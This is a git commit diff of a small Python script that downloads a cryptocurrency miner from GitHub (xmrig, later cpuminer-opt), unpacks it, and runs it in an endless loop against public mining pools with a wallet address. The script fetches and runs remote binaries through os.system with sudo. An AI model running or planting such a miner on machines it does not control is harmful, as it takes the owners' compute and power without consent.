fc66654b3f6a5eb468ef7667aecc6b1405e1f932
Arco <49058858+arcofb@users.noreply.github.com>
2020-09-03 14:14:06 +0700

    Update m.py

--- m.py
+++ m.py
@@ -1,13 +1,13 @@
 import sys
 import os
 from time import sleep
-os.system('clear')
-os.system('wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz')
+os.system('sudo apt install wget -y')
 sleep(2)
-os.system('tar -zxf xmrig-5.5.1-xenial-x64.tar.gz')
+os.system('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz')
 sleep(2)
-os.system('cd xmrig-5.5.1')
+os.system('tar xf cpuminer-opt-linux.tar.gz')
 sleep(2)
 while(True):
-	os.system(' ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
-	sleep(2)
+	os.system('clear')
+	os.system('timeout 1800 ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.eu.mine.zpool.ca:6242 -u MQvjjPLGJCeHjtjKEHqnV5hBq2kFmWyAea -p c=LTC,zap=MBC')
+	sleep(600)
